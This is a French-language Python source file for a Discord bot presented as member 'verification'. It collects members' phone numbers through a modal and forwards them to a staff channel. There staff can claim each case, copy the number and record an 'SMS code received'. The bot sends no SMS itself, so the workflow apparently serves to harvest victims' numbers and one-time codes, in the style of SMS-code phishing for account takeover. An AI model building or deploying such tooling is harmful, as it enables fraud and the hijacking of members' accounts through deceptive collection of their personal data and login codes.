from flask import Flask
from threading import Thread
import discord
from discord.ext import commands
import os

# --- SERVEUR WEB FLASK POUR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "Je suis bien en ligne !"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

# --- CONFIGURATION DU BOT DISCORD ---
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ID de ton salon staff
STAFF_CHANNEL_ID = 1530354736866263042

# Dictionnaire pour le suivi en temps réel des membres
VERIFICATION_MESSAGES = {}

# --- COULEUR DU THÈME ---
TANA_PINK = discord.Color.from_rgb(255, 153, 153) # Rose Tanalounge

# --- MODAL POUR QUE LE MEMBRE ENTRE SON NUMÉRO ---
class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de téléphone"):
    # Note : Discord ne permet pas de changer la couleur de la bordure du TextInput par programmation,
    # elle est définie par défaut par le thème client de l'utilisateur.
    phone_input = discord.ui.TextInput(
        label="Entre ton numéro (10 chiffres, sans lettres)",
        placeholder="Ex: 0612345678",
        min_length=10,
        max_length=10,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        numero = self.phone_input.value

        # Vérification stricte : uniquement des chiffres
        if not numero.isdigit():
            await interaction.response.send_message("❌ Ton numéro ne doit contenir **que des chiffres**, sans lettres ni espaces.", ephemeral=True)
            return

        await interaction.response.send_message("✅ Ton numéro a bien été transmis au staff ! Patiente quelques instants.", ephemeral=True)

        # Envoi dans le salon Staff
        staff_channel = bot.get_channel(STAFF_CHANNEL_ID)
        if staff_channel:
            embed = discord.Embed(
                title="VÉRIFICATION",
                color=TANA_PINK # Utilisation du rose
            )
            
            embed.add_field(name="Utilisateur", value=f"{interaction.user.mention}", inline=False)
            embed.add_field(name="ID", value=f"`{interaction.user.id}`", inline=False)
            embed.add_field(name="Opérateur (préfixe)", value="**Inconnu**", inline=False)
            embed.add_field(name="Numéro", value=f"`{numero}`", inline=False)
            embed.add_field(name="🟢 Présence", value="✅ Toujours dans le serveur", inline=False)
            embed.add_field(name="🔑 Code SMS", value="⏳ En attente...", inline=False)
            
            embed.set_footer(text=f"{interaction.guild.name} · Espace Makeur")

            view = VerificationView(numero=numero)
            msg = await staff_channel.send(embed=embed, view=view)
            
            VERIFICATION_MESSAGES[interaction.user.id] = msg

# --- VUE DU BOUTON "SE VÉRIFIER" ---
class PublicVerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Se vérifier", style=discord.ButtonStyle.green, custom_id="public_verify_btn")
    async def verify_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = UserPhoneNumberModal()
        await interaction.response.send_modal(modal)

# --- MODAL POUR QUE LE STAFF ENTRE LE CODE SMS ---
class StaffCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
    code_input = discord.ui.TextInput(
        label="Code SMS reçu",
        placeholder="Ex: 4829",
        min_length=3,
        max_length=10,
        required=True
    )

    def __init__(self, verification_view):
        super().__init__()
        self.verification_view = verification_view

    async def on_submit(self, interaction: discord.Interaction):
        code_saisi = self.code_input.value
        
        embed = interaction.message.embeds[0]
        
        champ_trouve = False
        for i, field in enumerate(embed.fields):
            if "Code SMS" in field.name:
                embed.set_field_at(i, name="🔑 Code SMS", value=f"✅ Reçu : `{code_saisi}`", inline=False)
                champ_trouve = True
                break
        
        if not champ_trouve:
            embed.add_field(name="🔑 Code SMS", value=f"✅ Reçu : `{code_saisi}`", inline=False)

        await interaction.response.edit_message(embed=embed, view=self.verification_view)
        await interaction.followup.send(f"✅ Code SMS enregistré avec succès : `{code_saisi}`", ephemeral=True)

# --- VUE DES ACTIONS DU STAFF ---
class VerificationView(discord.ui.View):
    def __init__(self, numero: str):
        super().__init__(timeout=None)
        self.numero = numero
        self.claimed_by = None

    @discord.ui.button(label="Claim", style=discord.ButtonStyle.green, emoji="✅", custom_id="claim_btn")
    async def claim_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Ce dossier a déjà été pris en charge par un autre membre du staff !", ephemeral=True)
            return
        
        self.claimed_by = interaction.user.id
        button.label = f"Claimé par {interaction.user.name}"
        button.disabled = True
        
        await interaction.response.edit_message(view=self)
        await interaction.followup.send(f"🔒 Dossier claimé par {interaction.user.mention}. Vous seul pouvez désormais gérer cette vérification.", ephemeral=True)

    @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.secondary, emoji="📩", custom_id="ask_code_btn")
    async def ask_code_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
            return
        modal = StaffCodeModal(self)
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Copier", style=discord.ButtonStyle.primary, emoji="📋", custom_id="copy_btn")
    async def copy_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
            return
        await interaction.response.send_message(f"`{self.numero}`", ephemeral=True)

    @discord.ui.button(label="Accepter", style=discord.ButtonStyle.success, emoji="✔", custom_id="accept_btn")
    async def accept_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Vous ne pouvez pas valider ce dossier !", ephemeral=True)
            return
        
        for child in self.children:
            child.disabled = True
        
        await interaction.response.edit_message(view=self)
        await interaction.followup.send("✅ Vérification acceptée avec succès.", ephemeral=True)

    @discord.ui.button(label="Refuser", style=discord.ButtonStyle.danger, emoji="✖", custom_id="refuse_btn")
    async def refuse_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Vous ne pouvez pas refuser ce dossier !", ephemeral=True)
            return
        
        for child in self.children:
            child.disabled = True
            
        await interaction.response.edit_message(view=self)
        await interaction.followup.send("❌ Vérification refusée.", ephemeral=True)

@bot.event
async def on_ready():
    print(f"Bot connecté en tant que {bot.user}")

@bot.event
async def on_member_remove(member):
    """Met à jour en temps réel si le membre quitte le serveur"""
    if member.id in VERIFICATION_MESSAGES:
        message = VERIFICATION_MESSAGES[member.id]
        try:
            embed = message.embeds[0]
            embed.color = discord.Color.from_rgb(231, 76, 60)
            
            champ_trouve = False
            for i, field in enumerate(embed.fields):
                if "Présence" in field.name:
                    embed.set_field_at(i, name="🔴 Présence", value="❌ A quitté le serveur", inline=False)
                    champ_trouve = True
                    break
            if not champ_trouve:
                embed.add_field(name="🔴 Présence", value="❌ A quitté le serveur", inline=False)

            await message.edit(embed=embed)
        except Exception as e:
            print(f"Erreur lors de la mise à jour du départ du membre : {e}")

@bot.command()
async def setup_verify(ctx):
    """Envoie le message avec le bouton 'Se vérifier' sur le serveur principal"""
    embed = discord.Embed(
        title="📱 Vérification",
        description="Clique sur le bouton ci-dessous pour entrer ton numéro et lancer ta vérification.\nLe staff recevra ensuite ta demande.",
        color=TANA_PINK # Utilisation du rose
    )
    view = PublicVerifyView()
    await ctx.send(embed=embed, view=view)

bot.run(os.environ['DISCORD_TOKEN'])